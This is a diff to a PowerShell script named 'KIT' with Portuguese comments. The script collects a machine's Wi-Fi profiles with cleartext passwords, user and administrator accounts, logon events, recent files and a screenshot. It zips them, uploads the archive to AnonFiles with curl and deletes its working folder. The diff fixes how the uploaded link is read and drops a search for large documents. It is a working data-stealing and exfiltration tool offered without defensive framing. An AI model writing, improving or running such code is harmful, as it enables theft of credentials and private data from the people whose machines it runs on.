@@ -1,4 +1,4 @@
-# ---------- KIT v5.2 – correção log Security ----------
+# ---------- KIT v5.3 – sem busca de Top10 + regex de URL corrigida ----------
 $ErrorActionPreference = "Stop"
 $kit     = "$env:TEMP\kit"
 $key     = "AFtru5qQZX8HN5npouThcNDJtVbe6d"
@@ -25,15 +25,12 @@ Write-Log "[INFO] Exportando perfis Wi-Fi..."
 Get-NetIPConfiguration | Out-File "$kit\netip.txt" -Encoding UTF8
 cmd /c "netsh wlan export profile key=clear folder=$kit"
 
-# 3) Contas & privilégios  (LINHA 32~36 CORRIGIDAS)
+# 3) Contas & privilégios
 Write-Log "[INFO] Listando usuários e admins..."
 Get-CimInstance Win32_UserAccount | Out-File "$kit\users.txt" -Encoding UTF8
 net localgroup administradores | Out-File "$kit\admins.txt" -Encoding UTF8
-
-# ---- NOVO BLOCO: só lê 4624 se log existir ----
 $secLog = Get-WinEvent -ListLog Security -EA SilentlyContinue
 if ($secLog -and $secLog.RecordCount) {
-    Write-Log "[INFO] Coletando logons (Security 4624)..."
     Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -Max 200 -EA SilentlyContinue |
         Select TimeCreated,Id,LevelDisplayName,Message |
         Out-File "$kit\logons.txt" -Encoding UTF8
@@ -67,15 +64,7 @@ Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" |
     Select Name,LastWriteTime |
     Out-File "$kit\recent.txt" -Encoding UTF8
 
-# 8) TOP 10 arquivos
-Write-Log "[INFO] Buscando top 10 arquivos maiores em C:\ (profundidade 2)..."
-$exts = @("*.pdf","*.doc*","*.xls*","*.txt","*.csv","*.db","*.sqlite","*.pst")
-Get-ChildItem C:\ -Include $exts -Recurse -Depth 2 -EA SilentlyContinue |
-    Sort Length -Descending |
-    Select -First 10 FullName,Length,LastWriteTime |
-    Export-Csv "$kit\top10.csv" -NoTypeInformation
-
-# 9) Screenshot
+# 8) Screenshot
 Write-Log "[INFO] Tirando screenshot..."
 Add-Type -AssemblyName System.Windows.Forms
 $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
@@ -87,19 +76,20 @@ $bmp.Save($pathSS,[System.Drawing.Imaging.ImageFormat]::Jpeg)
 $g.Dispose(); $bmp.Dispose()
 [System.GC]::Collect(); Start-Sleep -Milliseconds 200
 
-# 10) Compactação sem corrupção
+# 9) Compactação sem corrupção
 Write-Log "[INFO] Compactando pacote..."
 $zip = "$env:TEMP\kit_$(Get-Date -Format yyyyMMdd_HHmmss).zip"
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 [System.IO.Compression.ZipFile]::CreateFromDirectory($kit,$zip,'Optimal',$false)
 Write-Log "[ZIP] Criado: $zip ($(Get-Item $zip).Length) bytes)"
 
-# 11) Upload AnonFiles
+# 10) Upload AnonFiles (regex corrigido)
 Write-Log "[UP] Enviando para AnonFiles..."
 try {
     $reply = curl.exe -s -F "file=@`"$zip`"" "$upUrl"
     Write-Log "[UP] Resposta bruta: $reply"
-    if ($reply -match '"url":"([^"]+)"') {
+    # regex ajustado para o JSON real
+    if ($reply -match '"full":"([^"]+)"') {
         Write-Log "[OK] Upload finalizado – link: $($matches[1])"
     } else {
         Write-Log "[ERRO] Falha ao obter URL pública"
@@ -108,7 +98,7 @@ try {
     Write-Log "[ERRO] Exceção no upload: $_"
 }
 
-# 12) Limpeza
+# 11) Limpeza
 Write-Log "[CLEAN] Removendo pasta temporária..."
 Remove-Item $kit -Recurse -Force
 Write-Log "[END] KIT finalizado. Log completo em $logFile"
